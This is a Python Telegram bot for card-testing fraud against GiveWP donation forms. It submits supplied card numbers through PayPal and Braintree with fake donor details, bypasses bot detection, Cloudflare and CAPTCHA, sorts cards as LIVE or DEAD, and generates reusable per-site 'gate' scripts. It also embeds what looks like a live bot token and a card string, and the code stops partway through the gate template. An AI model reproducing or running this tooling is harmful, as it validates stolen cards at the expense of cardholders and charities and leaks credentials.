#!/usr/bin/env python3
"""
GiveWP Bot v22 — Ultimate Complete Edition
============================================
كل حاجة من 22 إصدار في ملف واحد:
- Playwright Engine + Requests Engine + Unified Checker
- Classifier دقيق (success:false = DEAD)
- استخراج كل الحقول (hidden/select/radio/checkbox/textarea)
- ملء billing + branch_selection + terms + honoree
- يجرب كل الـ gateways (paypal-commerce, paypal, paypal_standard)
- يجرب كل المبالغ (levels, min, 1-100)
- Cloudflare + CAPTCHA handling
- IFrame form detection
- Gate file generator (ملف Python جاهز)
- تقرير كامل بالشكل المطلوب
- إرسال الملفات للمستخدم
- /start /help /paypal /test /mass /stop
"""

import os
import sys
import asyncio
import json
import re
import time
import random
import threading
import traceback
from datetime import datetime
from io import BytesIO
from urllib.parse import urlparse

# ═══════════════════════════════════════════════════════════════
# ENV
# ═══════════════════════════════════════════════════════════════
os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc")
OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
ADMINS = [str(OWNER_ID)]
TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")

# ═══════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════
import telebot
from telebot import types
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    def random_ua():
        try: return _UA.random
        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"
except:
    def random_ua():
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
        ])

try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("⚠️ Playwright not installed")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
processing_status = {}


# ═══════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════
PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
STREETS = ["123 Main Street", "456 Oak Avenue", "789 Pine Road", "321 Elm Boulevard"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
STATES = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH"]
ZIPS = ["10001", "90001", "60601", "77001", "85001", "19101", "33101", "44101"]
COUNTRIES = ["US", "United States"]

AMOUNTS_TO_TRY = ["5", "10", "20", "25", "50", "100", "1", "2", "3"]
GATEWAYS_TO_TRY = ["paypal-commerce", "paypal", "paypal_standard", "give_paypal"]


# ═══════════════════════════════════════════════════════════════
# CLASSIFIER — مع إصلاح success:false
# ═══════════════════════════════════════════════════════════════
class Classifier:
    PAYPAL_CODES = [
        "CHARGE_SUCCESS", "APPROVED", "COMPLETED",
        "ORDER_NOT_APPROVED", "INSUFFICIENT_FUNDS", "DO_NOT_HONOR",
        "ACCOUNT_CLOSED", "LOST_OR_STOLEN", "CVV2_FAILURE", "CVV_FAILURE",
        "SUSPECTED_FRAUD", "PAYER_CANNOT_PAY", "GENERIC_DECLINE",
        "RESTRICTED_OR_INACTIVE_ACCOUNT", "INVALID_OR_RESTRICTED_CARD",
        "EXPIRED_CARD", "AUTHENTICATION_REQUIRED", "PAYER_ACTION_REQUIRED",
        "TX_ATTEMPTS_EXCEED_LIMIT", "SECURITY_VIOLATION",
        "COMPLIANCE_VIOLATION", "TRANSACTION_NOT_PERMITTED",
        "PAYMENT_DENIED", "APPROVED_PENDING_CAPTURE",
    ]

    DEAD_CODES = {
        "CLOUDFLARE": ["just a moment", "checking your browser", "verifying you are", "cf-browser-verification", "cf_chl"],
        "CAPTCHA": ["captcha", "not a robot", "recaptcha", "hcaptcha", "turnstile"],
        "GATEWAY_DISABLED": ["gateway is not enabled", "payment gateway is not", "gateway not available"],
        "JS_CONFLICT": ["javascript conflict", "connection between this site"],
        "FORM_NOT_PUBLISHED": ["form not published", "no form"],
        "SPAM": ["flagged as spam"],
        "NO_FORM": ["form not found", "no donation form"],
        "NO_PAYPAL": ["paypal not available", "paypal is not"],
    }

    @classmethod
    def classify(cls, raw_text):
        """
        يرجّع (status, code)
        - success:false = DEAD (مع استثناءات PayPal codes)
        - success:true = LIVE
        - PayPal codes = LIVE
        """
        if not raw_text:
            return "DEAD", "EMPTY"

        text = raw_text.strip()
        up = text.upper()

        # ═══ PAYPAL ORDER MISSING = DEAD ═══
        if "PAYPAL ORDER ID IS MISSING" in up or ("ORDER ID" in up and "MISSING" in up):
            return "DEAD", "PAYPAL_ORDER_MISSING"

        # ═══ JSON parse ═══
        try:
            js = json.loads(text)
            success = js.get("success")
            if success is True:
                return "LIVE", "CHARGE_SUCCESS"
            if success is False:
                data = js.get("data", {})
                # نبحث عن PayPal codes في error/data
                err_str = json.dumps(data).upper()
                for code in cls.PAYPAL_CODES:
                    if code in err_str:
                        return "LIVE", code
                # errors nested
                return "DEAD", "SUCCESS_FALSE"
        except (json.JSONDecodeError, ValueError):
            pass

        # ═══ PayPal codes مباشرة ═══
        for code in cls.PAYPAL_CODES:
            if code.upper() in up:
                return "LIVE", code

        # ═══ DEAD cases ═══
        for code, kws in cls.DEAD_CODES.items():
            for kw in kws:
                if kw in text.lower():
                    return "DEAD", code

        return "UNKNOWN", "UNKNOWN"

    @classmethod
    def extract_code(cls, raw_text):
        if not raw_text: return None
        up = raw_text.upper()
        for code in cls.PAYPAL_CODES:
            if code in up:
                return code
        return None


# ═══════════════════════════════════════════════════════════════
# PLAYWRIGHT ENGINE
# ═══════════════════════════════════════════════════════════════
class PlaywrightEngine:
    def __init__(self, url, card, verbose=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.debug = {
            "steps": [], "network": [], "paypal": [],
            "form_found": None, "amount_selected": None,
            "paypal_frame": False, "card_filled": False,
            "captcha_detected": False, "order_id": None,
            "extracted": {}, "raw_response": "",
        }

    def log(self, msg):
        if self.verbose: print(msg)
        self.debug["steps"].append(msg)

    async def _on_response(self, response):
        try:
            u = response.url
            body = ""
            if any(k in u for k in ["create_order", "confirm-payment", "approve_order",
                                     "checkout/orders", "admin-ajax.php", "give_process"]):
                try: body = await response.text()
                except: pass
                self.debug["network"].append({"url": u[:150], "status": response.status, "body": body[:2000]})
                # استخرج order_id
                if "create_order" in u:
                    try:
                        js = json.loads(body)
                        if isinstance(js.get("data"), dict) and js["data"].get("id"):
                            self.debug["order_id"] = js["data"]["id"]
                    except: pass
                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                    self.debug["paypal"].append({"status": response.status, "body": body[:2000]})
                    self.debug["raw_response"] = body[:2000]
        except: pass

    async def run(self):
        if not HAS_PW:
            return {"status": "DEAD", "code": "NO_PLAYWRIGHT", "debug": self.debug}

        async with async_playwright() as p:
            self.log("🚀 launching chromium...")
            try:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-setuid-sandbox",
                          "--disable-blink-features=AutomationControlled",
                          "--disable-dev-shm-usage", "--disable-gpu",
                          "--no-first-run", "--no-zygote", "--single-process",
                          "--disable-features=IsolateOrigins,site-per-process",
                          "--disable-web-security", "--ignore-certificate-errors",
                          "--allow-running-insecure-content"],
                )
            except Exception as e:
                return {"status": "DEAD", "code": f"LAUNCH_FAILED: {str(e)[:120]}", "debug": self.debug}

            try:
                context = await browser.new_context(
                    user_agent=random_ua(),
                    viewport={"width": 1366, "height": 900},
                    locale="en-US", timezone_id="America/New_York",
                    ignore_https_errors=True, java_script_enabled=True,
                )
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    window.chrome = {runtime: {}, app: {}, csi: () => {}, loadTimes: () => {}};
                """)
                page = await context.new_page()
                page.on("response", self._on_response)
                return await self._execute(page)
            finally:
                try: await browser.close()
                except: pass

    async def _execute(self, page):
        # 1. Load
        self.log(f"[1] goto {self.url}")
        try: await page.goto(self.url, wait_until="domcontentloaded", timeout=45000)
        except: pass
        await asyncio.sleep(3)

        # 2. Cloudflare
        html = await page.content()
        if any(x in html.lower() for x in ["just a moment", "verifying you are", "checking your browser"]):
            self.log("[2] cloudflare wait...")
            for _ in range(5):
                await asyncio.sleep(5)
                html = await page.content()
                if "just a moment" not in html.lower(): break
            else:
                return {"status": "DEAD", "code": "CLOUDFLARE", "raw": "cloudflare", "debug": self.debug}

        # 3. CAPTCHA
        if any(x in html.lower() for x in ["g-recaptcha", "hcaptcha", "turnstile"]):
            self.debug["captcha_detected"] = True
            self.log("[3] captcha")
            await self._try_bypass_captcha(page)

        # 4. Extract form info
        self.debug["extracted"] = self._extract_info_from_html(html)

        # 5. Find form
        form_info = await self._find_form(page)
        if not form_info:
            return {"status": "DEAD", "code": "NO_FORM", "raw": "no form", "debug": self.debug}
        self.debug["form_found"] = form_info["type"]

        # 6. Fill personal
        await self._fill_personal(page)

        # 7. Select amount
        amount = await self._select_amount(page)
        self.debug["amount_selected"] = amount

        # 8. Fill billing
        await self._fill_billing(page)

        # 9. Fill all required
        await self._fill_required(page)

        # 10. Terms
        await self._check_terms(page)

        # 11. Click donate
        clicked = await self._click_donate(page)
        if not clicked:
            return {"status": "DEAD", "code": "CLICK_FAILED", "debug": self.debug}

        await asyncio.sleep(4)

        # 12. Wait PayPal
        paypal = await self._wait_paypal(page, timeout=25)
        if not paypal:
            page_text = await page.inner_text("body")
            st, cd = Classifier.classify(page_text)
            return {"status": st, "code": cd, "raw": page_text[:500], "debug": self.debug}

        self.debug["paypal_frame"] = True

        # 13. Fill card
        card_ok = await self._fill_card(paypal)
        self.debug["card_filled"] = card_ok
        if not card_ok:
            return {"status": "DEAD", "code": "CARD_FILL_FAILED", "debug": self.debug}

        # 14. Submit
        await self._submit(paypal)
        await asyncio.sleep(6)

        # 15. Read result
        return await self._read_result(page, paypal)

    def _extract_info_from_html(self, html):
        info = {}
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: info["form_id_prefix"] = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: info["form_id"] = m.group(1)
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: info["nonce"] = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m: info["min"] = m.group(1)
        m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
        if m: info["price_id"] = m.group(1)
        m = re.search(r'"data-client-token"\s*:\s*"([^"]+)"', html)
        if m: info["client_token_prefix"] = m.group(1)[:60]
        return info

    async def _try_bypass_captcha(self, page):
        try:
            for frame in page.frames:
                if "recaptcha" in frame.url.lower() or "hcaptcha" in frame.url.lower():
                    try:
                        checkbox = frame.locator("#recaptcha-anchor, .recaptcha-checkbox")
                        if await checkbox.count() > 0:
                            await checkbox.first.click()
                            await asyncio.sleep(3)
                    except: pass
        except: pass

    async def _find_form(self, page):
        selectors = ["form.give-form", "form[id*='give-form']",
                     ".give-form-wrap form", "form[class*='give']",
                     "input[name='give-amount']"]
        for sel in selectors:
            try:
                if await page.locator(sel).first.count() > 0:
                    return {"type": "main", "selector": sel}
            except: pass
        for frame in page.frames:
            if frame == page.main_frame: continue
            for sel in selectors:
                try:
                    if await frame.locator(sel).count() > 0:
                        return {"type": "iframe", "frame": frame}
                except: continue
        return None

    async def _fill_personal(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        email = f"user{int(time.time()*1000)%999999}@gmail.com"
        for frame in page.frames:
            for sel, val in [
                ("input[name='give_first']", first),
                ("input[name='give_last']", last),
                ("input[name='give_email']", email),
                ("input[name*='first_name']", first),
                ("input[name*='last_name']", last),
                ("input[type='email']", email),
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        await loc.fill(val)
                except: continue

    async def _select_amount(self, page):
        amounts = list(AMOUNTS_TO_TRY)
        for frame in page.frames:
            try:
                loc = frame.locator("input[name='give-form-minimum']").first
                if await loc.count() > 0:
                    mv = await loc.get_attribute("value")
                    if mv and float(mv) > 0:
                        amt = str(int(float(mv))) if float(mv).is_integer() else mv
                        if amt not in amounts: amounts.insert(0, amt)
            except: pass
        for amt in amounts:
            for frame in page.frames:
                r = await self._try_amount(frame, amt)
                if r: return r
        return None

    async def _try_amount(self, frame, amt):
        # 1. input
        try:
            inp = frame.locator("input[name='give-amount']").first
            if await inp.count() > 0 and await inp.is_visible(timeout=300):
                await inp.fill(amt)
                return amt
        except: pass
        # 2. custom
        try:
            inp = frame.locator("input[name='give-custom-amount'], input.give-custom-amount, input[id*='custom-amount']").first
            if await inp.count() > 0:
                await inp.fill(amt)
                return amt
        except: pass
        # 3. data-price
        for val in [amt, f"{amt}.00"]:
            try:
                el = frame.locator(f"[data-price='{val}']").first
                if await el.count() > 0:
                    await el.scroll_into_view_if_needed()
                    await el.click()
                    return amt
            except: pass
        # 4. radio
        for val in [amt, f"{amt}.00"]:
            try:
                radio = frame.locator(f"input[type='radio'][value='{val}']").first
                if await radio.count() > 0:
                    await radio.check(force=True)
                    return amt
            except: pass
        # 5. button
        try:
            btn = frame.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
            if await btn.count() > 0:
                await btn.click()
                return amt
        except: pass
        # 6. select
        try:
            for name in ["select[name*='amount']", "select[name='give-amount']"]:
                sel = frame.locator(name).first
                if await sel.count() > 0:
                    try:
                        await sel.select_option(amt)
                        return amt
                    except: pass
        except: pass
        # 7. label
        try:
            lbl = frame.locator(f"label:has-text('${amt}')").first
            if await lbl.count() > 0:
                await lbl.click()
                return amt
        except: pass
        return None

    async def _fill_billing(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        street = random.choice(STREETS)
        city = random.choice(CITIES)
        state = random.choice(STATES)
        zipcode = random.choice(ZIPS)
        for frame in page.frames:
            for sel, val in [
                ("input[name*='billing'][name*='first']", first),
                ("input[name*='billing'][name*='last']", last),
                ("input[name*='address']", street),
                ("input[name*='city']", city),
                ("input[name*='zip']", zipcode),
                ("input[name*='postal']", zipcode),
                ("input[name*='phone']", "5551234567"),
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        await loc.fill(val)
                except: continue
            for name in ["billing_country", "mailing_country", "card_country"]:
                try:
                    loc = frame.locator(f"select[name*='{name}']").first
                    if await loc.count() > 0:
                        try: await loc.select_option("US")
                        except: pass
                except: continue
            for name in ["billing_state", "mailing_state", "card_state"]:
                try:
                    loc = frame.locator(f"select[name*='{name}']").first
                    if await loc.count() > 0:
                        try: await loc.select_option(state)
                        except: pass
                except: continue

    async def _fill_required(self, page):
        for frame in page.frames:
            try:
                selects = await frame.locator("select").all()
                for sel in selects:
                    try:
                        name = await sel.get_attribute("name") or ""
                        if any(k in name.lower() for k in ["country", "state", "billing", "mailing", "card_"]):
                            continue
                        opts = await sel.locator("option").all()
                        valid = []
                        for opt in opts:
                            v = await opt.get_attribute("value")
                            if v and v not in ("", "0", "-1"): valid.append(v)
                        if valid: await sel.select_option(valid[0])
                    except: continue
            except: pass
            try:
                radios = await frame.locator("input[type='radio']").all()
                seen = set()
                for r in radios:
                    try:
                        name = await r.get_attribute("name") or ""
                        if not name or name in seen: continue
                        if any(k in name.lower() for k in ["payment-mode", "gateway"]): continue
                        await r.check(force=True)
                        seen.add(name)
                    except: continue
            except: pass

    async def _check_terms(self, page):
        for frame in page.frames:
            try:
                cbs = await frame.locator(
                    "input[type='checkbox'][name*='terms'], "
                    "input[type='checkbox'][name*='agree'], "
                    "input[type='checkbox'][name*='condition'], "
                    "input[type='checkbox'][name*='accept']"
                ).all()
                for cb in cbs:
                    try:
                        if not await cb.is_checked(): await cb.check(force=True)
                    except:
                        try: await cb.click(force=True)
                        except: pass
            except: continue

    async def _click_donate(self, page):
        selectors = ["button.give-submit", "input.give-submit",
                     "button[type='submit'][class*='give']",
                     "input[type='submit'][value*='Donate' i]",
                     "button:has-text('Donate Now')", "button:has-text('Donate')",
                     "button:has-text('Give Now')", "button:has-text('Give')",
                     "button:has-text('Submit')", "button[type='submit']",
                     "input[type='submit']"]
        for frame in page.frames:
            for sel in selectors:
                try:
                    btn = frame.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=800):
                        await btn.scroll_into_view_if_needed()
                        await asyncio.sleep(0.3)
                        try: await btn.click(timeout=5000)
                        except: await btn.click(force=True, timeout=5000)
                        return True
                except: continue
        return False

    async def _wait_paypal(self, page, timeout=25):
        for _ in range(timeout * 2):
            for frame in page.frames:
                if frame == page.main_frame: continue
                if any(k in frame.url.lower() for k in ["paypal", "braintree", "card-fields", "hosted-fields"]):
                    try:
                        if await frame.locator("input").count() > 0: return frame
                    except: continue
            try:
                iframes = await page.locator("iframe").all()
                for iframe in iframes:
                    try:
                        src = await iframe.get_attribute("src") or ""
                        if any(k in src.lower() for k in ["paypal", "braintree", "card"]):
                            fr = await iframe.content_frame()
                            if fr:
                                try:
                                    if await fr.locator("input").count() > 0: return fr
                                except: pass
                    except: continue
            except: pass
            try:
                card = page.locator("input[autocomplete='cc-number'], input[name*='cardnumber']").first
                if await card.count() > 0: return page
            except: pass
            await page.wait_for_timeout(500)
        return None

    async def _fill_card(self, frame):
        try:
            parts = self.card.strip().split("|")
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]

            await asyncio.sleep(2)

            # email
            for sel in ["input[type='email']", "input[name*='email']"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(f"u{int(time.time()*1000)%999999}@gmail.com")
                        break
                except: continue

            # card number
            ok = False
            for sel in ["input#credit-card-number", "input[name='cardnumber']",
                        "input[name='card-number']", "input[autocomplete='cc-number']",
                        "input[placeholder*='Card number' i]", "input[placeholder*='Card Number' i]",
                        "input[type='tel'][name*='card']"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(n)
                        ok = True
                        break
                except: continue
            if not ok: return False

            await asyncio.sleep(0.5)

            # expiry
            for sel in ["input#expiration-date", "input[name='exp']",
                        "input[autocomplete='cc-exp']",
                        "input[placeholder*='MM / YY' i]", "input[placeholder*='MM/YY' i]"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(f"{mm}/{yy}")
                        break
                except: continue

            # cvc
            for sel in ["input#cvv", "input#cvc", "input[name='cvv']",
                        "input[autocomplete='cc-csc']",
                        "input[placeholder*='CVV' i]", "input[placeholder*='CVC' i]"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(cvc)
                        break
                except: continue

            await asyncio.sleep(0.5)
            return True
        except: return False

    async def _submit(self, frame):
        for sel in ["button:has-text('Pay')", "button:has-text('Continue')",
                    "button:has-text('Complete')", "button[type='submit']", "button#btn-pay"]:
            try:
                btn = frame.locator(sel).first
                if await btn.count() > 0 and await btn.is_visible(timeout=800):
                    await btn.click(timeout=5000)
                    return True
            except: continue
        return False

    async def _read_result(self, page, frame):
        # 1. network
        for r in self.debug["paypal"]:
            st, cd = Classifier.classify(r.get("body", ""))
            if st == "LIVE":
                return {"status": "LIVE", "code": cd, "raw": r["body"][:1500], "debug": self.debug}

        # 2. page text
        texts = []
        try:
            if frame: texts.append(await frame.inner_text("body"))
        except: pass
        try:
            texts.append(await page.inner_text("body"))
        except: pass

        for t in texts:
            if not t: continue
            st, cd = Classifier.classify(t)
            if st == "LIVE":
                return {"status": "LIVE", "code": cd, "raw": t[:1500], "debug": self.debug}

        # 3. alerts
        try:
            alerts = await page.locator("[role='alert'], .give_error, .error, .alert").all()
            for a in alerts:
                at = await a.inner_text()
                if at:
                    st, cd = Classifier.classify(at)
                    return {"status": st, "code": cd, "raw": at[:1500], "debug": self.debug}
        except: pass

        return {"status": "UNKNOWN", "code": "NO_RESPONSE",
                "raw": (texts[0] if texts else "")[:1000], "debug": self.debug}


# ═══════════════════════════════════════════════════════════════
# REQUESTS ENGINE (Fallback)
# ═══════════════════════════════════════════════════════════════
class RequestsEngine:
    def __init__(self, url, card, verbose=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.r = requests.Session()
        self.r.verify = False
        p = urlparse(url)
        self.host = p.netloc
        self.path = p.path + ("?" + p.query if p.query else "")
        self.base = f"https://{self.host}"
        self.form_id1 = None
        self.form_id2 = None
        self.nonce = None
        self.min_amount = None
        self.access_token = None
        self.ajax_url = f"{self.base}/wp-admin/admin-ajax.php"
        self.fields = {}
        self.levels = []
        self.gateways = []
        self.has_captcha = False
        self.debug = {"steps": [], "attempts": [], "raw": []}

    def log(self, m):
        if self.verbose: print(m)
        self.debug["steps"].append(m)

    def _get_page(self):
        try:
            r = self.r.get(self.url, headers={"user-agent": random_ua()},
                          timeout=30, cookies=self.r.cookies)
            html = r.text or ""
            if len(html) < 100: return ""
            if "give-form-id-prefix" not in html or "give-form-hash" not in html:
                for pat in [r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
                            r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                            r'<iframe[^>]*src="([^"]*donation[^"]*)"']:
                    m = re.search(pat, html, re.IGNORECASE)
                    if m:
                        iurl = m.group(1)
                        if iurl.startswith("//"): iurl = "https:" + iurl
                        elif iurl.startswith("/"): iurl = f"{self.base}{iurl}"
                        r2 = self.r.get(iurl, headers={"user-agent": random_ua()},
                                       timeout=25, cookies=self.r.cookies)
                        self.r.cookies.update(r2.cookies)
                        html = r2.text or ""
                        break
            return html
        except: return ""

    def _extract(self, html):
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: self.form_id1 = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: self.form_id2 = m.group(1)
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: self.nonce = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m and m.group(1).strip(): self.min_amount = m.group(1).strip()

        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
            tag = m.group(0)
            n = re.search(r'name=["\']([^"\']+)["\']', tag)
            v = re.search(r'value=["\']([^"\']*)["\']', tag)
            if n: self.fields[n.group(1)] = v.group(1) if v else ""

        for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.DOTALL):
            name = m.group(1)
            opts = re.findall(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2))
            valid = [o for o in opts if o and o not in ("", "0", "-1")]
            if valid: self.fields[name] = valid[0]

        for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', html):
            tag = m.group(0)
            n = re.search(r'name=["\']([^"\']+)["\']', tag)
            if n and any(k in n.group(1).lower() for k in ["terms", "agree", "accept"]):
                self.fields[n.group(1)] = "on"

        for pat, pg, ag in [
            (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1, 2),
            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2, 1)]:
            for m in re.finditer(pat, html):
                try: self.levels.append((m.group(pg), m.group(ag)))
                except: pass

        for m in re.finditer(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html):
            self.gateways.append(m.group(1))

        if "g-recaptcha" in html or "hcaptcha" in html: self.has_captcha = True

        for pat in [r'"data-client-token"\s*:\s*"([^"]+)"', r'"accessToken"\s*:\s*"([^"]{20,})"']:
            m = re.search(pat, html)
            if m:
                try:
                    enc = m.group(1)
                    if "client-token" in pat:
                        dec = __import__("base64").b64decode(enc).decode("utf-8", errors="ignore")
                        au = re.search(r'"accessToken":"([^"]+)"', dec)
                        if au: self.access_token = au.group(1)
                    else: self.access_token = enc
                except: pass

        return bool(self.form_id1 and self.nonce)

    def _build(self, gw, amt, pid, include_amt=True):
        base = {
            "give-honeypot": "", "give-form-id-prefix": self.form_id1 or "",
            "give-form-id": self.form_id2 or "", "give-form-title": "",
            "give-current-url": self.url, "give-form-url": self.url,
            "give-form-minimum": self.min_amount or "", "give-form-maximum": "999999.99",
            "give-form-hash": self.nonce or "", "give-price-id": pid,
            "payment-mode": gw, "give_first": "Test", "give_last": "Bot",
            "give_email": f"user{random.randint(1000,99999)}@gmail.com",
            "card_name": "Test Bot", "give-gateway": gw,
        }
        if include_amt: base["give-amount"] = amt
        for k, v in self.fields.items():
            if k not in base: base[k] = v
        if self.has_captcha: base["g-recaptcha-response"] = ""
        return MultipartEncoder({k: (None, v) for k, v in base.items()})

    def charge(self):
        result = {"status": "DEAD", "code": "UNKNOWN", "raw": "", "debug": self.debug}
        html = self._get_page()
        if not html:
            result["code"] = "GET_FAILED"
            return result
        if not self._extract(html):
            result["code"] = "FORM_NOT_FOUND"
            return result

        attempts = []
        for pid, amt in self.levels:
            attempts.append((pid, amt, True, f"level={pid}=${amt}"))
        if self.min_amount:
            attempts.append(("custom", self.min_amount, True, f"custom+min={self.min_amount}"))
        for a in AMOUNTS_TO_TRY[:4]:
            attempts.append(("custom", a, True, f"custom+{a}"))
        attempts.append(("custom", "", True, "empty"))

        gateways = self.gateways or GATEWAYS_TO_TRY

        for gw in gateways:
            for pid, amt, inc, label in attempts:
                data = self._build(gw, amt, pid, inc)
                headers = {
                    "content-type": data.content_type,
                    "origin": self.base, "referer": self.url,
                    "user-agent": random_ua(),
                    "x-requested-with": "XMLHttpRequest",
                }
                try:
                    r = self.r.post(self.ajax_url, params={"action": "give_process_donation"},
                                   headers=headers, data=data, cookies=self.r.cookies, timeout=25)
                    self.debug["attempts"].append({
                        "gw": gw, "amt": amt, "pid": pid,
                        "status": r.status_code, "body": r.text[:1000]})
                    st, cd = Classifier.classify(r.text)
                    if st == "LIVE":
                        result.update({"status": "LIVE", "code": cd, "raw": r.text[:1500]})
                        return result
                    if cd in ("GATEWAY_DISABLED", "CAPTCHA"):
                        break
                except: continue

        if self.debug["attempts"]:
            result["raw"] = self.debug["attempts"][-1]["body"][:1000]
        return result


# ═══════════════════════════════════════════════════════════════
# UNIFIED CHECKER
# ═══════════════════════════════════════════════════════════════
def check_site(url, card):
    if HAS_PW:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                engine = PlaywrightEngine(url, card, verbose=False)
                r = loop.run_until_complete(engine.run())
                if r["status"] in ("LIVE", "UNKNOWN"):
                    return r
                if r["status"] == "DEAD" and r["code"] not in (
                    "CLOUDFLARE", "CAPTCHA", "GATEWAY_DISABLED", "FORM_NOT_PUBLISHED"):
                    req = RequestsEngine(url, card, verbose=False)
                    r2 = req.charge()
                    if r2["status"] == "LIVE":
                        return r2
                    return r
                return r
            finally:
                loop.close()
        except Exception as e:
            try:
                req = RequestsEngine(url, card, verbose=False)
                return req.charge()
            except:
                return {"status": "DEAD", "code": f"ALL_FAILED: {str(e)[:80]}", "debug": {}}
    else:
        req = RequestsEngine(url, card, verbose=False)
        return req.charge()


# ═══════════════════════════════════════════════════════════════
# GATE FILE GENERATOR
# ═══════════════════════════════════════════════════════════════
GATE_TEMPLATE = '''"""
Gate: {domain}
Form ID: {form_id}
Amount: {amount}
Extracted: {timestamp}
Test Card: {test_card}
"""

import requests
import re
import base64
import json
import random
from requests_toolbelt.multipart.encoder import MultipartEncoder

PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"


class PayPal:
    def __init__(self):
        self.url = "{url}"
        self.host = "{host}"
        self.path = "{path}"
        self.base = f"https://{{self.host}}"
        self.ajax_url = f"{{self.base}}/wp-admin/admin-ajax.php"
        self.form_id1 = "{form_id1}"
        self.form_id2 = "{form_id2}"
        self.nonce = "{nonce}"
        self.price_id = "{price_id}"
        self.amount = "{amount}"
        self.access_token = None
        self.r = requests.Session()
        self.r.verify = False

    def _extract_token(self):
        try:
            r = self.r.get(self.url, headers={{"user-agent": UA}}, timeout=25, cookies=self.r.cookies)
            html = r.text
            self.r.cookies.update(r.cookies)
            m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', html)
            if m:
                enc = m.group(1)
                try:
                    dec = base64.b64decode(enc).decode("utf-8", errors="ignore")
                    au = re.search(r'"accessToken":"([^"]+)"', dec)
                    if au:
                        self.access_token = au.group(1)
                        return True
                except: pass
            m = re.search(r'"accessToken"\\s*:\\s*"([^"]{{20,}})"', html)
            if m:
                self.access_token = m.group(1)
                return True
        except: pass
        return False

    def _build(self, amt):
        return MultipartEncoder({{
            "give-honeypot": (None, ""),
            "give-form-id-prefix": (None, self.form_id1),
            "give-form-id": (None, self.form_id2),
            "give-form-title": (None, ""),
            "give-current-url": (None, self.url),
